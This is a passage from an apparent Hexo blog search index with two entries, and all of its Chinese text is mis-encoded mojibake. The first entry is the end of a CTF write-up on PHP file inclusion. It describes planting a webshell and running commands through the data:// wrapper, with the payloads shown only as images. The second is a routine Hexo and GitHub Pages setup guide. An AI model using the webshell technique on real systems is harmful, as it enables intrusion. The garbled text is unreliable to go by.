id="æ–¹æ³•2ï¼ˆdata-ä¸Šä¼ æœ¨é©¬ï¼‰"><a href="#æ–¹æ³•2ï¼ˆdata-ä¸Šä¼ æœ¨é©¬ï¼‰" class="headerlink" title="æ–¹æ³•2ï¼ˆdata:&#x2F;&#x2F;ä¸Šä¼ æœ¨é©¬ï¼‰"></a>æ–¹æ³•2ï¼ˆdata:&#x2F;&#x2F;ä¸Šä¼ æœ¨é©¬ï¼‰</h2><p>ç¬¬ä¸€ç§é“¾æ¥æ–¹å¼ï¼š</p><p><img src="/2023/07/20/php-include/image/image-20230720201235539-1700990453114-253.png"></p><p><img src="/2023/07/20/php-include/image/image-20230720201155971-1700990453116-255.png"></p><p>ç¬¬äºŒç§é“¾æ¥æ–¹å¼ï¼š</p><p><img src="/2023/07/20/php-include/image/image-20230720201719427-1700990453116-254.png"></p><p>çœŸçš„æœäº†çœŸä¸ªé¢˜äº†ï¼Œé‚£ä¸ªbase64ç¼–ç å†è¿èšå‰‘ï¼Œé‚£ä¸ªå¯†ç 1å’Œaæˆ‘éƒ½è¯•äº†å°±æ˜¯ä¸è¡Œï¼Œç”¨cxkå°±å¯ä»¥ï¼Œå¦¥å¦¥çš„å°é»‘å­</p><p>å¤§æ¦‚è·Ÿbase64ç¼–ç æœ‰é—®é¢˜ï¼Œä»¥åé¢ç•™é•¿ä¸€ç‚¹ç‚¹ï¼Œé•¿è®°æ€§</p><h2 id="æ–¹æ³•3ï¼ˆdata-å‘½ä»¤æ‰§è¡Œï¼‰"><a href="#æ–¹æ³•3ï¼ˆdata-å‘½ä»¤æ‰§è¡Œï¼‰" class="headerlink" title="æ–¹æ³•3ï¼ˆdata:&#x2F;&#x2F;å‘½ä»¤æ‰§è¡Œï¼‰"></a>æ–¹æ³•3ï¼ˆdata:&#x2F;&#x2F;å‘½ä»¤æ‰§è¡Œï¼‰</h2><p>åªæ˜¯data:&#x2F;&#x2F;åè®®çš„å…¶ä¸­ä¸€ä¸ªç”¨æ³•</p><p>data:&#x2F;&#x2F;åè®®è·Ÿphp:&#x2F;&#x2F;inputç±»ä¼¼ï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“ä»–ä¸<strong>åŒ…å«å‡½æ•°</strong>æ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data:&#x2F;&#x2F;æµä¼šè¢«<strong>å½“åšPHPä»£ç æ‰§è¡Œ</strong></p><p>æ„é€ æ–¹å¼è·Ÿinputä¸€æ ·ï¼Œä¸è¿‡å˜æˆäº†GETä¼ å‚ </p><p><img src="/2023/07/20/php-include/image/image-20230720203539785-1700990453116-256.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo+Githubåšå®¢æ­å»ºæ•™ç¨‹ï¼ˆä¸ªäººæ“ä½œè¿‡ç¨‹ï¼‰</title>
      <link href="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/"/>
      <url>/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo-Githubåšå®¢æ­å»ºæ•™ç¨‹ï¼ˆä¸ªäººæ“ä½œè¿‡ç¨‹ï¼‰"><a href="#Hexo-Githubåšå®¢æ­å»ºæ•™ç¨‹ï¼ˆä¸ªäººæ“ä½œè¿‡ç¨‹ï¼‰" class="headerlink" title="Hexo+Githubåšå®¢æ­å»ºæ•™ç¨‹ï¼ˆä¸ªäººæ“ä½œè¿‡ç¨‹ï¼‰"></a><a href="https://so.csdn.net/so/search?q=Hexo&spm=1001.2101.3001.7020">Hexo</a>+Githubåšå®¢æ­å»ºæ•™ç¨‹ï¼ˆä¸ªäººæ“ä½œè¿‡ç¨‹ï¼‰</h1><p>æœ€è¿‘è‡ªå·±å°è¯•åˆ©ç”¨hexo+githubæ­å»ºäº†blogï¼Œæ¥è®°å½•ä¸€ä¸‹è¿‡ç¨‹</p><p>##ä¸€ã€å‡†å¤‡ç¯å¢ƒ</p><h2 id="1ã€nodeç¯å¢ƒ"><a href="#1ã€nodeç¯å¢ƒ" class="headerlink" title="1ã€nodeç¯å¢ƒ"></a>1ã€nodeç¯å¢ƒ</h2><p>é¦–å…ˆï¼Œå®‰è£… nodejsï¼Œ å› ä¸ºHexoæ˜¯åŸºäº Node.js é©±åŠ¨çš„ä¸€æ¬¾åšå®¢æ¡†æ¶ã€‚</p><p><strong><a href="http://nodejs.cn/">http://nodejs.cn</a></strong> </p><h2 id="2ã€git-ç¯å¢ƒ"><a href="#2ã€git-ç¯å¢ƒ" class="headerlink" title="2ã€git ç¯å¢ƒ"></a>2ã€git ç¯å¢ƒ</h2><p>ç„¶åï¼Œå®‰è£…git, ä¸€ä¸ªåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œç”¨äºé¡¹ç›®çš„ç‰ˆæœ¬æ§åˆ¶ç®¡ç†ï¼Œä½œè€…æ˜¯ Linux ä¹‹çˆ¶ã€‚</p><p>â­Gitï¼ˆå®˜ç½‘ï¼‰<strong><a href="https://git-scm.com/">https://git-scm.com/</a></strong></p><p>å¤ªæ…¢çš„è¯å¯ä»¥è‡ªè¡Œæ‰¾èµ„æº</p><pre><code>å®‰è£…è¿‡ç¨‹ä¸€è·¯nextå°±è¡Œï¼ˆå®‰è£…è·¯å¾„å¯æ”¹ï¼‰ä¸¤è€…å®‰è£…å®Œæˆä¹‹åï¼Œå³å‡»æ­¤ç”µè„‘&gt;å±æ€§&gt;é«˜çº§ç³»ç»Ÿè®¾ç½®&gt;ç¯å¢ƒå˜é‡&gt;ç³»ç»Ÿå˜é‡ä¸‹çš„Path å¯ä»¥çœ‹åˆ°ä¸¤è€…å·²è‡ªåŠ¨ä¿®æ”¹äº†ç¯å¢ƒå˜é‡ï¼Œè¿™æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡cmdå‘½ä»¤ï¼ˆwin+råè¾“å…¥cmdï¼‰æŸ¥çœ‹ä¸¤è€…ç‰ˆæœ¬ã€‚(ç¡®è®¤æ˜¯å¦å®‰è£…æˆåŠŸåŠå¯ä»¥ä½¿ç”¨) æŸ¥çœ‹Node.jsç‰ˆæœ¬å‘½ä»¤ï¼šnode -v æŸ¥çœ‹Gitç‰ˆæœ¬å‘½ä»¤ï¼šgit --version</code></pre><h2 id="3-ä¹‹åè¿›å…¥GitHubåˆ›å»ºä¸€ä¸ªä»“åº“"><a href="#3-ä¹‹åè¿›å…¥GitHubåˆ›å»ºä¸€ä¸ªä»“åº“" class="headerlink" title="3.ä¹‹åè¿›å…¥GitHubåˆ›å»ºä¸€ä¸ªä»“åº“"></a>3.ä¹‹åè¿›å…¥GitHubåˆ›å»ºä¸€ä¸ªä»“åº“</h2><blockquote><p><strong>ç¡®è®¤æ³¨å†Œåä¼šè®©ç”¨æˆ·é€‰æ‹©å…¬æœ‰è¿˜æ˜¯ç§æœ‰ä»“åº“(ç§æœ‰çš„ä¸ªäººä»“åº“å¥½åƒéœ€è¦Moneyå¥½åƒæ˜¯æ¯æœˆ7ç¾é‡‘)</strong><br><strong>ä¸ªäººåšå®¢çš„è¯ç›´æ¥é€‰å…è´¹çš„å°±è¡Œäº†</strong><br><strong>æ³¨æ„ä»“åº“çš„å–åæ ¼å¼ï¼šç”¨æˆ·å.github.io(è¿™å°†æ˜¯ä»¥åçš„è®¿é—®åŸŸå)</strong></p></blockquote><blockquote><p><strong>åˆ°è¿™é‡Œä»£è¡¨æˆ‘ä»¬Githubè´¦å·ä»¥åŠä»“åº“éƒ½å·²ç»åˆ›å»ºå®Œæ¯•</strong><br><strong>å¯ä»¥æŠŠä¸‹é¢è¿™æ®µä»“åº“çš„åœ°å€å¤åˆ¶ä¸‹æ¥ç•™ç€åé¢é…ç½®æ—¶ä¼šç”¨åˆ°</strong></p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716091944628-1700990345403-145-1700994540501-119.png"></p><h2 id="4-æ¥ä¸‹æ¥è¿›å…¥æœ¬åœ°é…ç½®å®‰è£…Hexo"><a href="#4-æ¥ä¸‹æ¥è¿›å…¥æœ¬åœ°é…ç½®å®‰è£…Hexo" class="headerlink" title="4. æ¥ä¸‹æ¥è¿›å…¥æœ¬åœ°é…ç½®å®‰è£…Hexo"></a>4. æ¥ä¸‹æ¥è¿›å…¥æœ¬åœ°é…ç½®å®‰è£…Hexo</h2><p><strong>åœ¨ç£ç›˜ä¸­åˆ›å»ºä¸€ä¸ªç”¨æ¥å­˜æ”¾Githubæœ¬åœ°ä»“åº“æ–‡ä»¶çš„ç›®å½•(å¯è‡ªå®šä¹‰ç›®å½•å­˜æ”¾ï¼Œé¡¾åæ€ä¹‰blog&#x3D;&#x3D;åšå®¢)</strong></p><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716092108512-1700990345403-147-1700994540501-120.png"></p><p>é€‰ä¸­åˆ›å»ºçš„ç›®å½•(æ–‡ä»¶å¤¹)å³é”®é€‰æ‹©ä½¿ç”¨Gti Bash Hereæ‰“å¼€Gitå‘½ä»¤çª—å£(è¿™å°±æ˜¯å¼€å§‹å®‰è£…çš„Gitå·¥å…·ï¼Œç°åœ¨å¼€å§‹ä½¿ç”¨)<br>ä¹Ÿå¯ä»¥ä½¿ç”¨Windowsçš„cmdå‘½ä»¤è¡Œ(ä¸æ¨è)<br>(å› ä¸ºæ˜¯ä»å›½å¤–æœåŠ¡å™¨ä¸‹è½½ï¼Œå—ç½‘ç»œçš„å½±å“æ¯”è¾ƒå¤§ï¼Œæœ‰å¯èƒ½ä¼šå‡ºç°å¼‚å¸¸ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿æ¥å›½å†…æ·˜å®å®˜æ–¹çš„æœåŠ¡å™¨æ¥è¿›è¡Œ)<br>è¾“å…¥å‘½ä»¤ï¼šnpm install -g cnpm â€“registry&#x3D;<a href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a><br>æ³¨ï¼šä¹‹åå†æ¬¡ä½¿ç”¨å‘½ä»¤åˆ™æ˜¯ä»¥cnpmå¼€å¤´~è€Œä¸æ˜¯npm<br><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716092323573-1700990345403-146-1700994540501-122.png"></p><blockquote><p><strong>æ­£å¼å¼€å§‹å®‰è£…hexo</strong><br><strong>è¾“å…¥å‘½ä»¤ï¼šcnpm install -g hexo-cli</strong></p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716092359590-1700990345403-148-1700994540501-121.png"></p><blockquote><p><strong>ä¹‹åå°±æ˜¯åˆå§‹åŒ–Hexo</strong><br><strong>è¾“å…¥å‘½ä»¤ï¼šhexo init</strong></p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716092518819-1700990345403-149-1700994540501-123.png"></p><p><strong>è¿™æ—¶æˆ‘ä»¬åˆ›å»ºçš„ç›®å½•(æ–‡ä»¶å¤¹)ä¸‹å·²ç»å¤šå‡ºè®¸å¤šæ–‡ä»¶</strong></p><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716092548657-1700990345403-150-1700994540501-124.png"></p><p>æ–°å»ºå®Œæˆåï¼ŒæŒ‡å®šæ–‡ä»¶å¤¹Hexoç›®å½•ä¸‹æœ‰ï¼š</p><pre><code>node_modules: ä¾èµ–åŒ…publicï¼šå­˜æ”¾ç”Ÿæˆçš„é¡µé¢scaffoldsï¼šç”Ÿæˆæ–‡ç« çš„ä¸€äº›æ¨¡æ¿sourceï¼šç”¨æ¥å­˜æ”¾ä½ çš„æ–‡ç« themesï¼šä¸»é¢˜**_config.yml: åšå®¢çš„é…ç½®æ–‡ä»¶**</code></pre><p>è¿™æ ·æœ¬åœ°çš„ç½‘ç«™é…ç½®ä¹Ÿå¼„å¥½å•¦ï¼Œè¾“å…¥hexo gç”Ÿæˆé™æ€ç½‘é¡µï¼Œç„¶åè¾“å…¥hexo sæ‰“å¼€æœ¬åœ°æœåŠ¡å™¨ï¼Œ</p><blockquote><p><strong>è¿™æ—¶å¯åŠ¨hexoä¹‹ååœ¨æµè§ˆå™¨è¾“å…¥localhost:4000å°±å¯ä»¥åœ¨æœ¬åœ°æµè§ˆåšå®¢(è‡ªå¸¦ä¸€ç¯‡Hello Worldåšå®¢)</strong><br><strong>è¾“å…¥å‘½ä»¤ï¼šhexo s</strong><br><strong>å…³é—­hexo ctrl + c</strong></p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716092739503-1700990345403-152-1700994540501-125.png"></p><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716092810228-1700990345403-153-1700994540501-126.png"></p><h2 id="5-è®¾ç½®ssh"><a href="#5-è®¾ç½®ssh" class="headerlink" title="5. è®¾ç½®ssh"></a>5. è®¾ç½®ssh</h2><blockquote><p><strong>ç”Ÿæˆsshkey</strong><br><strong>è¾“å…¥å‘½ä»¤ï¼šcd ~&#x2F;.sshè¿›å…¥.sshæ–‡ä»¶</strong></p><p><strong>è¾“å…¥å‘½ä»¤ï¼šssh-keygen -t rsa -C â€˜æ³¨å†Œæ—¶çš„é‚®ç®±åœ°å€â€™</strong> </p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716093006803-1700990345403-155-1700994540501-127.png"></p><p><strong>æ­¤æ—¶æˆ‘ä»¬å»æŸ¥çœ‹Cç›˜ç›®å½•(æ­¤æ–‡ä»¶å¤¹æ‰€åœ¨C:\ç”¨æˆ·\ç”¨æˆ·åç›®å½•ä¸‹)</strong></p><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716093119089-1700990345403-154-1700994540501-128.png"></p><p><strong>ä½¿ç”¨è®°äº‹æœ¬æ‰“å¼€id_rsa.putæ–‡ä»¶å¹¶å¤åˆ¶ç”Ÿæˆçš„key</strong></p><p><strong>åœ¨å·²ç™»é™†çš„Githubä¸»é¡µç‚¹å‡»å³ä¾§å¤´åƒ ã€‹ Settingsè®¾ç½®</strong></p><p>å†ç‚¹å‡»SSH and GPG keys ã€‹ New SSH key</p><p><strong>å°†åˆšåˆšåœ¨.sshç›®å½•ä¸‹æ‰€å¤åˆ¶id_rsa.pubæ–‡ä»¶ä¸­çš„ä¿¡æ¯å¤åˆ¶è¿›key(æ³¨æ„ç©ºæ ¼)ï¼Œåœ¨ç»™å®ƒå–ä¸ªåå­—(éšæ„)</strong></p><blockquote><p><strong>è¿™é‡Œéœ€è¦åœ¨æœ¬åœ°è¿›è¡ŒéªŒè¯ä¸€æ¬¡</strong><br><strong>è¾“å…¥å‘½ä»¤ï¼šssh -T <a href="mailto:&#x67;&#x69;&#116;&#64;&#103;&#105;&#116;&#x68;&#117;&#x62;&#46;&#x63;&#x6f;&#109;">&#x67;&#x69;&#116;&#64;&#103;&#105;&#116;&#x68;&#117;&#x62;&#46;&#x63;&#x6f;&#109;</a> å¹¶ä¸”è¾“å…¥yesä¹‹åï¼Œè¡Œæœ«å°¾ä¼šæ˜¾ç¤ºä½ çš„ç”¨æˆ·å</strong></p><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716093403459-1700990345403-151-1700994540501-129.png"></p></blockquote><p><strong>ç»‘å®šæˆåŠŸå¹¶ä¸”ä¼šé‚®ç®±æ”¶åˆ°é‚®ä»¶</strong></p><blockquote><p><strong>æ¥ç€åœ¨æœ¬åœ°ç»‘å®šä¸Githubçš„ç”¨æˆ·åå’Œé‚®ç®±</strong><br><strong>è¾“å…¥å‘½ä»¤ï¼šgit config â€“global user.name â€œæ³¨å†Œæ—¶ç”¨æˆ·åâ€</strong><br><strong>è¾“å…¥å‘½ä»¤ï¼šgit config â€“global user.email â€œæ³¨å†Œæ—¶é‚®ç®±â€</strong></p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716093550811-1700990345403-156-1700994540501-130.png"></p><h2 id="6-ä¸Šä¼ æµ‹è¯•åšå®¢"><a href="#6-ä¸Šä¼ æµ‹è¯•åšå®¢" class="headerlink" title="6. ä¸Šä¼ æµ‹è¯•åšå®¢"></a>6. ä¸Šä¼ æµ‹è¯•åšå®¢</h2><blockquote><p>æ‰“å¼€å¹¶ä¿®æ”¹æœ¬åœ°ä»“åº“ç›®å½•ä¸‹_config.ymlæ–‡ä»¶</p></blockquote><blockquote><p><strong>åœ¨æ–‡ä»¶çš„æœ«å°¾ä¿®æ”¹(repositoryå±æ€§çš„åœ°å€å°±æ˜¯ä¹‹å‰åˆ›å»ºä»“åº“åæ‰€ä¿å­˜çš„httpåœ°å€)</strong><br>deploy:<br>type: git<br>repository: <a href="https://github.com/%E7%94%A8%E6%88%B7%E5%90%8D/%E7%94%A8%E6%88%B7%E5%90%8D.github.io.git">https://github.com/ç”¨æˆ·å/ç”¨æˆ·å.github.io.git</a></p><p>branch: master</p></blockquote><blockquote><p><strong>æ­¤æ—¶éœ€è¦å®‰è£…ä¸€ä¸ªä¸Šä¼ å·¥å…·</strong><br><strong>è¾“å…¥å‘½ä»¤ï¼šcnpm install hexo-deployer-git</strong></p></blockquote><blockquote><p><strong>å¯ä»¥æ–°å»ºä¸€ç¯‡æµ‹è¯•æ–‡ç« (ä¸æ–°å»ºçš„è¯ä¹Ÿä¼šæœ‰ä¸€ç¯‡è‡ªå¸¦çš„Hello Worldæ–‡ç« )</strong><br><strong>è¾“å…¥å‘½ä»¤ï¼šhexo new â€œæ–‡ç« åç§°â€</strong></p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716094542664-1700990345403-157-1700994540501-131.png"></p><blockquote><p><strong>æ–°å»ºæ–‡ç« ä¹‹åéœ€è¦ç”Ÿæˆä¸€éæ–‡ä»¶</strong><br><strong>è¾“å…¥å‘½ä»¤ï¼šhexo g</strong></p><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716094611137-1700990345403-158-1700994540501-133.png"></p></blockquote><blockquote><p><strong>æ–°å»ºæ–‡ç« åå¯åœ¨æœ¬åœ°å…ˆé¢„è§ˆä¸€é</strong><br><strong>è¾“å…¥å‘½ä»¤ï¼šhexo sæµè§ˆå™¨è¾“å…¥ï¼šlocalhost:4000(ctrl + c å…³é—­)</strong></p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/20200331230142753-1700990345403-159-1700994540501-132.png"></p><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716094741275-1700990345404-161-1700994540501-134.png"></p><blockquote><p><strong>æœ€åç›´æ¥éƒ¨ç½²åˆ°Githubå°±å¯ä»¥å•¦</strong><br><strong>è¾“å…¥å‘½ä»¤ï¼šhexo d</strong></p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716095642961-1700990345404-160-1700994540501-135.png"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
